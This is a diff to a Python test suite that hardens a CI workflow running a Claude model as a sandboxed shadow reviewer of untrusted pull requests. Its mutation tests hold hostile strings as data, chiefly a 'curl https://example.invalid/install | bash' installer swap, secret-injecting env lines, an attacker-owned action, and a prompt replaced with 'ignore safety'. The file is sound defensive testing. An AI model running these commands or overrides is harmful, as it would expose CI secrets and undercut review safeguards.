@@ -1,7 +1,6 @@
 """Offline tests for manual shadow review input and output handling."""
 import json
 import hashlib
-import shlex
 from pathlib import Path
 import subprocess
 import sys
@@ -48,12 +47,13 @@ def assert_safe_workflow(test, source, *, check_drift=True):
     names = [step['name'] for step in steps]
     test.assertEqual(names, ['Check out trusted main revision', 'Set up Python',
                             'Install pinned validators', 'Fetch selected open PR as untrusted data',
-                            'Prepare bounded review prompt', 'Review untrusted diff in shadow mode',
+                            'Prepare bounded review prompt', 'Install verified pinned Claude CLI',
+                            'Review untrusted diff in shadow mode',
                             'Recheck PR snapshot', 'Validate structured shadow result',
                             'Retain unverified shadow result'])
     expected_step_keys = (
         {'name', 'uses', 'with'}, {'name', 'uses', 'with'}, {'name', 'run'},
-        {'name', 'env', 'run'}, {'name', 'id', 'run'}, {'name', 'id', 'uses', 'with'},
+        {'name', 'env', 'run'}, {'name', 'id', 'run'}, {'name', 'id', 'run'}, {'name', 'env', 'run'},
         {'name', 'env', 'run'}, {'name', 'env', 'run'}, {'name', 'uses', 'with'},
     )
     test.assertEqual(tuple(set(step) for step in steps), expected_step_keys)
@@ -66,9 +66,10 @@ def assert_safe_workflow(test, source, *, check_drift=True):
         'd034d82e8cca34d9f2d8c33119719c682f1f9e3cb81153473a66bccb7b1a9d83',
         'eb2df55ad6e2aba3f0021368ace46aa40a53648b4f4e1a75b7cc9dfec4cc6195',
         '0d19fc86bb5b3648cfe0686e4b315046db271549efc293e9090c45cfe41f4ec8',
-        '5c39a00ed629725bd2bf438d3ca3babf00c20d9f0dbf68f06a07eaf085a870a9',
+        'e3dd125d6c2e2e05a2525c649c04066ac1744c6af6ddb436f0e524c31a858094',
+        'dbbe56a15457b40bebac11e21c7a1a7c779afb33fb3193fefa5c6b397c5ce1b3',
         'cde30f3df120ef5a4a3ae8b4289be578959872133614845f163562c609c5f732',
-        'd9e22fb1a5f64bf67e68c1e3a1014b8cfd54ffd2eb04511701a16531b1a80114',
+        '6405d32cfcf00203222b44932df1fc785f23b3801a1c0b7b3520708425d93ea7',
         'cce028b3865113044280ab2a9f01310f0840c0afdc4d73d8d4764d52762f379f',
     )
     actual = tuple(hashlib.sha256(json.dumps(step, sort_keys=True, separators=(',', ':')).encode()).hexdigest()
@@ -97,42 +98,57 @@ def assert_safe_workflow(test, source, *, check_drift=True):
         'jq --arg sha "$merge_base" \'. + {mergeBaseOid: $sha}\' "$RUNNER_TEMP/pr-before.json" > "$RUNNER_TEMP/pr-before-bound.json"',
     ])
     test.assertNotIn('gh pr diff', steps[3]['run'])
-    review = steps[5]
-    test.assertEqual(review['uses'], 'anthropics/claude-code-action@61a9c274fa7110a66dfafc1bbbced03833eb25fe')
-    test.assertEqual(set(review), {'name', 'id', 'uses', 'with'})
-    test.assertEqual(set(review['with']), {'claude_code_oauth_token', 'github_token', 'prompt', 'claude_args'})
-    test.assertEqual(review['with']['claude_code_oauth_token'], '${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}')
-    test.assertEqual(review['with']['github_token'], '${{ github.token }}')
-    test.assertEqual(review['with']['prompt'], '${{ steps.prepared.outputs.prompt }}')
-    args = shlex.split(review['with']['claude_args'])
-    test.assertEqual(args[:7], ['--model', 'claude-opus-5-5', '--max-turns', '1',
-                                '--tools=', '--disallowedTools', 'mcp__*'])
-    test.assertEqual(len(args), 9)
-    test.assertEqual(args[7], '--json-schema')
-    test.assertIsInstance(json.loads(args[8]), dict)
+    test.assertEqual(steps[5]['id'], 'claude_binary')
+    test.assertEqual(steps[5]['run'], 'binary=$(python -m tools.install_claude_shadow)\nprintf \'path=%s\\n\' "$binary" >> "$GITHUB_OUTPUT"\n')
+    review = steps[6]
+    test.assertEqual(review['env'], {'CLAUDE_CODE_OAUTH_TOKEN': '${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}',
+                                    'CLAUDE_SHADOW_PROMPT': '${{ steps.prepared.outputs.prompt }}',
+                                    'CLAUDE_SHADOW_BINARY': '${{ steps.claude_binary.outputs.path }}'})
+    test.assertEqual(review['run'], 'python -m tools.run_claude_shadow --binary "$CLAUDE_SHADOW_BINARY" --destination "$RUNNER_TEMP/claude-model-output.json"')
     test.assertEqual(steps[1]['uses'], 'actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065')
     test.assertEqual(steps[1]['with'], {'python-version': '3.11'})
-    test.assertEqual(steps[8]['uses'], 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02')
+    test.assertEqual(steps[9]['uses'], 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02')
     test.assertEqual(steps[3]['env'], {'GH_TOKEN': '${{ github.token }}', 'PR_NUMBER': '${{ inputs.pr_number }}'})
-    test.assertEqual(steps[6]['env'], steps[3]['env'])
-    test.assertEqual(steps[7]['env'], {'CLAUDE_SHADOW_RESULT': '${{ steps.review.outputs.structured_output }}',
-                                       'SHADOW_PR_NUMBER': '${{ inputs.pr_number }}'})
+    test.assertEqual(steps[7]['env'], steps[3]['env'])
+    test.assertEqual(steps[8]['env'], {'SHADOW_PR_NUMBER': '${{ inputs.pr_number }}'})
     test.assertEqual(steps[2]['run'], 'python -m pip install --require-hashes --only-binary=:all: --platform manylinux2014_x86_64 --python-version 3.11 --implementation cp --abi cp311 --target architecture/schemas/.vendor -r architecture/schemas/requirements-shadow-runtime.lock')
-    recheck = [line.strip() for line in steps[6]['run'].split('\n') if line.strip()]
+    recheck = [line.strip() for line in steps[7]['run'].split('\n') if line.strip()]
     test.assertEqual(recheck, [
         'gh pr view "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" --json baseRefName,baseRefOid,headRefOid,state > "$RUNNER_TEMP/pr-after.json"',
         'jq --arg sha "$(jq -r .mergeBaseOid "$RUNNER_TEMP/pr-before-bound.json")" \'. + {mergeBaseOid: $sha}\' "$RUNNER_TEMP/pr-after.json" > "$RUNNER_TEMP/pr-after-bound.json"',
     ])
-    test.assertEqual(steps[8]['with'], {'name': 'claude-shadow-result',
+    test.assertEqual(steps[9]['with'], {'name': 'claude-shadow-result',
                                        'path': '${{ runner.temp }}/claude-shadow-result.json',
                                        'retention-days': '1', 'if-no-files-found': 'error'})
     test.assertEqual(steps[4]['id'], 'prepared')
-    test.assertEqual(steps[5]['id'], 'review')
     test.assertEqual(steps[4]['run'], 'python -m tools.claude_shadow_workflow prepare --before "$RUNNER_TEMP/pr-before-bound.json" --diff "$RUNNER_TEMP/pr.diff" --prompt outputs/S2_CR_01_Claude_Review_Prompt_DRAFT.md --destination "$GITHUB_OUTPUT"')
-    test.assertEqual(steps[7]['run'], 'python -m tools.claude_shadow_workflow validate --before "$RUNNER_TEMP/pr-before-bound.json" --after "$RUNNER_TEMP/pr-after-bound.json" --diff "$RUNNER_TEMP/pr.diff" --destination "$RUNNER_TEMP/claude-shadow-result.json"')
+    test.assertEqual(steps[8]['run'], 'python -m tools.claude_shadow_workflow validate --before "$RUNNER_TEMP/pr-before-bound.json" --after "$RUNNER_TEMP/pr-after-bound.json" --diff "$RUNNER_TEMP/pr.diff" --response "$RUNNER_TEMP/claude-model-output.json" --destination "$RUNNER_TEMP/claude-shadow-result.json"')
+
+
+def assert_guard_keys(test, workflow):
+    test.assertEqual(set(workflow), {'name', 'on', 'permissions', 'jobs'})
+    test.assertEqual(set(workflow['jobs']), {'shadow-review-guard'})
+    job = workflow['jobs']['shadow-review-guard']
+    test.assertEqual(set(job), {'name', 'runs-on', 'timeout-minutes', 'steps'})
+    test.assertEqual(len(job['steps']), 5)
+    for index, step in enumerate(job['steps']):
+        test.assertEqual(set(step), {'name', 'uses', 'with'} if index < 2 else {'name', 'run'})
 
 
 class ShadowWorkflowTests(unittest.TestCase):
+    def test_direct_runner_source_is_review_pinned(self):
+        # This drift alarm is not a trusted check when PR code controls it.
+        source = Path('tools/run_claude_shadow.py').read_text(encoding='utf-8')
+        self.assertEqual(hashlib.sha256(source.encode('utf-8')).hexdigest(),
+                         '71f38ed25debc42f20639d5b92b91b22b474a50ccf5bd922c14351b7eb56702a')
+
+    def test_installer_source_is_review_pinned(self):
+        # Drift alarm only: a PR that changes this test can defeat it. An
+        # independently trusted required check remains a separate prerequisite.
+        source = Path('tools/install_claude_shadow.py').read_text(encoding='utf-8')
+        self.assertEqual(hashlib.sha256(source.encode('utf-8')).hexdigest(),
+                         '01ec440fb8b247cbf4ae4ca6026c5d636dcc3ce7e6b488508a9906cb62db25ab')
+
     def test_prompt_safety_text_is_review_pinned(self):
         prompt = Path('outputs/S2_CR_01_Claude_Review_Prompt_DRAFT.md').read_text(encoding='utf-8')
         self.assertEqual(hashlib.sha256(prompt.encode('utf-8')).hexdigest(),
@@ -144,6 +160,7 @@ class ShadowWorkflowTests(unittest.TestCase):
     def test_always_reporting_guard_workflow(self):
         source = Path('.github/workflows/shadow-review-guard.yml').read_text(encoding='utf-8')
         workflow = yaml.load(source, Loader=UniqueBaseLoader)
+        assert_guard_keys(self, workflow)
         self.assertEqual(set(workflow['on']), {'pull_request', 'push', 'workflow_dispatch'})
         self.assertEqual(workflow['on']['pull_request'], '')
         self.assertEqual(workflow['on']['push'], {'branches': ['main']})
@@ -161,7 +178,19 @@ class ShadowWorkflowTests(unittest.TestCase):
         self.assertEqual(steps[1]['with'], {'python-version': '3.11'})
         self.assertEqual(steps[2]['run'], 'python -m pip install --target architecture/schemas/.vendor -r architecture/schemas/requirements-schema.txt -r architecture/schemas/requirements-test.txt')
         self.assertEqual(steps[3]['run'], 'python -m pip install --require-hashes --only-binary=:all: --platform manylinux2014_x86_64 --python-version 3.11 --implementation cp --abi cp311 --target "$RUNNER_TEMP/shadow-lock" -r architecture/schemas/requirements-shadow-runtime.lock')
-        self.assertEqual(steps[4]['run'], 'python -m unittest tests.test_claude_shadow_workflow tests.test_review_verdict tests.test_review_shadow')
+        self.assertEqual(steps[4]['run'], 'python -m unittest tests.test_claude_shadow_workflow tests.test_review_verdict tests.test_review_shadow tests.test_install_claude_shadow tests.test_run_claude_shadow tests.test_shadow_tool_evidence tests.test_shadow_artifact_binding tests.test_shadow_container tests.test_shadow_egress_proxy tests.test_shadow_isolated_workflow tests.test_shadow_jobs tests.test_shadow_network_run tests.test_shadow_result_download')
+
+    def test_runtime_gates_do_not_restore_or_use_pip_caches(self):
+        for path in ('.github/workflows/runtime-invariant-gate.yml', '.github/workflows/stage1-exit-gate.yml',
+                     '.github/workflows/schema-gate.yml'):
+            workflow = yaml.load(Path(path).read_text(encoding='utf-8'), Loader=UniqueBaseLoader)
+            steps = next(iter(workflow['jobs'].values()))['steps']
+            for step in steps:
+                self.assertNotIn('cache', step.get('with', {}))
+                self.assertNotIn('cache-dependency-path', step.get('with', {}))
+                self.assertFalse(step.get('uses', '').startswith('actions/cache'))
+                if 'python -m pip install' in step.get('run', ''):
+                    self.assertIn('--no-cache-dir', step['run'])
 
     def test_guard_workflow_rejects_conditional_execution(self):
         source = Path('.github/workflows/shadow-review-guard.yml').read_text(encoding='utf-8')
@@ -172,13 +201,30 @@ class ShadowWorkflowTests(unittest.TestCase):
             self.assertNotIn('if', step)
             self.assertNotIn('continue-on-error', step)
 
+    def test_guard_rejects_shell_and_execution_overrides(self):
+        import copy
+        workflow = yaml.load(Path('.github/workflows/shadow-review-guard.yml').read_text(encoding='utf-8'), Loader=UniqueBaseLoader)
+        assert_guard_keys(self, workflow)
+        for level in ('workflow', 'job', 'step'):
+            for key, value in (('defaults', {'run': {'shell': 'true {0}'}}),
+                               ('shell', 'true {0}'), ('if', 'false'),
+                               ('continue-on-error', 'true'), ('env', {'TOKEN': 'injected'})):
+                candidate = copy.deepcopy(workflow)
+                target = candidate if level == 'workflow' else candidate['jobs']['shadow-review-guard']
+                if level == 'step':
+                    target = target['steps'][-1]
+                target[key] = value
+                with self.subTest(level=level, key=key), self.assertRaises(AssertionError):
+                    assert_guard_keys(self, candidate)
+
     def test_ci_runs_on_shadow_workflow_and_tool_changes(self):
         source = Path('.github/workflows/runtime-invariant-gate.yml').read_text(encoding='utf-8')
         workflow = yaml.load(source, Loader=UniqueBaseLoader)
         for event in ('pull_request', 'push'):
             with self.subTest(event=event):
                 paths = workflow['on'][event]['paths']
-                self.assertIn('.github/workflows/claude-review-shadow.yml', paths)
+                self.assertIn('architecture/retired/claude-review-shadow.yml', paths)
+                self.assertIn('.github/workflows/claude-review-isolated.yml', paths)
                 self.assertIn('tools/**', paths)
                 self.assertIn('tests/**', paths)
         steps = workflow['jobs']['runtime-invariant-gate']['steps']
@@ -186,11 +232,12 @@ class ShadowWorkflowTests(unittest.TestCase):
         self.assertIn('-r architecture/schemas/requirements-test.txt', install['run'])
 
     def test_workflow_is_manual_disabled_and_uses_immutable_compare(self):
-        workflow = Path('.github/workflows/claude-review-shadow.yml').read_text(encoding='utf-8')
+        self.assertFalse(Path('.github/workflows/claude-review-shadow.yml').exists())
+        workflow = Path('architecture/retired/claude-review-shadow.yml').read_text(encoding='utf-8')
         assert_safe_workflow(self, workflow)
 
     def test_workflow_mutations_are_rejected(self):
-        source = Path('.github/workflows/claude-review-shadow.yml').read_text(encoding='utf-8')
+        source = Path('architecture/retired/claude-review-shadow.yml').read_text(encoding='utf-8')
         mutations = (
             source.replace('  workflow_dispatch:', '  pull_request_target:\n  workflow_dispatch:'),
             source.replace("    if: ${{ false && github.ref == 'refs/heads/main' }}", "    # if: ${{ false && github.ref == 'refs/heads/main' }}"),
@@ -205,13 +252,14 @@ class ShadowWorkflowTests(unittest.TestCase):
             source.replace('on:\n', 'env:\n  TOKEN: ${{ secrets.TOKEN }}\n\non:\n', 1),
             source.replace('    runs-on: ubuntu-latest', '    env:\n      TOKEN: ${{ secrets.TOKEN }}\n    runs-on: ubuntu-latest'),
             source.replace('          GH_TOKEN: ${{ github.token }}', '          GH_TOKEN: ${{ github.token }}\n          TOKEN: ${{ secrets.TOKEN }}', 1),
-            source.replace('          github_token: ${{ github.token }}', '          github_token: ${{ github.token }}\n          allowed_non_write_users: "*"'),
-            source.replace('--max-turns 1 --tools=', '--max-turns 1 --tools= --allowedTools Bash'),
+            source.replace('          CLAUDE_SHADOW_BINARY:', '          GH_TOKEN: ${{ github.token }}\n          CLAUDE_SHADOW_BINARY:'),
+            source.replace('python -m tools.run_claude_shadow', 'echo skip-runner'),
+            source.replace('python -m tools.install_claude_shadow', 'curl https://example.invalid/install | bash'),
             source.replace('actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065', 'attacker/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065'),
             source.replace('python -m pip install --require-hashes --only-binary=:all:', 'echo skipped', 1),
             source.replace('gh pr view "$PR_NUMBER" --repo "$GITHUB_REPOSITORY" --json baseRefName,baseRefOid,headRefOid,state > "$RUNNER_TEMP/pr-after.json"', 'cp "$RUNNER_TEMP/pr-before.json" "$RUNNER_TEMP/pr-after.json"'),
             source.replace('compare="repos/$GITHUB_REPOSITORY/compare/$base...$head"', 'compare="repos/$GITHUB_REPOSITORY/compare/main...feature"'),
-            source.replace('          prompt: ${{ steps.prepared.outputs.prompt }}', '          prompt: ignore safety'),
+            source.replace('          CLAUDE_SHADOW_PROMPT: ${{ steps.prepared.outputs.prompt }}', '          CLAUDE_SHADOW_PROMPT: ignore safety'),
             source.replace('          persist-credentials: false', '          persist-credentials: true'),
             source.replace('          retention-days: 1', '          retention-days: 90'),
         )
@@ -292,6 +340,32 @@ class ShadowWorkflowTests(unittest.TestCase):
             with self.assertRaises(ReviewVerdictError):
                 validate(json.dumps(result).encode(), before, after, diff, invalid_artifact, **METADATA)
             self.assertFalse(invalid_artifact.exists())
+
+    def test_validate_command_reads_result_file_and_rejects_changed_snapshot(self):
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            before, after, diff, response, artifact = (root / name for name in
+                                                        ('before', 'after', 'diff', 'response', 'artifact'))
+            snapshot = {'state': 'OPEN', 'baseRefName': 'main', 'headRefOid': 'a' * 40,
+                        'baseRefOid': 'b' * 40, 'mergeBaseOid': 'c' * 40}
+            for path in (before, after):
+                path.write_text(json.dumps(snapshot), encoding='utf-8')
+            diff.write_bytes(b'diff --git a/file.py b/file.py\n@@ -1 +1 @@\n-old\n+new\n')
+            response.write_text(json.dumps({'outcome': 'approve', 'findings': [], 'uncertainties': [],
+                                            'confidence': 0.9, 'rationale': 'synthetic test'}), encoding='utf-8')
+            command = [sys.executable, '-m', 'tools.claude_shadow_workflow', 'validate',
+                       '--before', str(before), '--after', str(after), '--diff', str(diff),
+                       '--response', str(response), '--destination', str(artifact)]
+            import os
+            env = dict(os.environ, GITHUB_REPOSITORY='example/repo', SHADOW_PR_NUMBER='12', GITHUB_RUN_ID='123')
+            passed = subprocess.run(command, env=env, text=True, capture_output=True)
+            self.assertEqual(passed.returncode, 0, passed.stderr)
+            self.assertEqual(json.loads(artifact.read_text(encoding='utf-8'))['status'], 'shadow-unverified')
+            after.write_text(json.dumps(dict(snapshot, headRefOid='d' * 40)), encoding='utf-8')
+            second_artifact = root / 'rejected'
+            failed = subprocess.run(command[:-1] + [str(second_artifact)], env=env, text=True, capture_output=True)
+            self.assertNotEqual(failed.returncode, 0)
+            self.assertFalse(second_artifact.exists())
 
     def test_diff_content_separators_cannot_forge_headers_or_hunks(self):
         for separator in ('\r', '\x0b', '\x0c', '\x1c', '\x1d', '\x1e',
